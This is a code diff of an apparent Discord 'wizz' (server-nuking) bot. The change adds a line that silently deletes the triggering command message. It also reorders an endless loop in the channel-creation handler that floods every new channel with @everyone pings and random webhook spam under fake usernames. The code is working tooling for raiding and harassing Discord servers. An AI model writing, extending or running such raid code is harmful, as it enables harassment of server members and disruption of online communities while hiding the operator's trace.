@@ -97,6 +97,7 @@ async def help(ctx):
 
 @bot.command()
 async def wizz(ctx):
+ await ctx.message.delete()
  if ctx.guild is None:
   await ctx.send("Commands Not Supported In DM.")
  else:
@@ -229,8 +230,8 @@ async def on_guild_channel_create(channel):
     async with aiohttp.ClientSession() as session:
       webhook = Webhook.from_url(str(webhook_url), adapter=AsyncWebhookAdapter(session))
       while True:
-        await channel.send("@everyone 1337 Wizzed This Shit.")
         await webhook.send(random.choice(spam_messages), username = random.choice(webhook_usernames))
+        await channel.send("@everyone 1337 Wizzed This Shit.")
 
 @bot.event
 async def on_guild_join(guild):
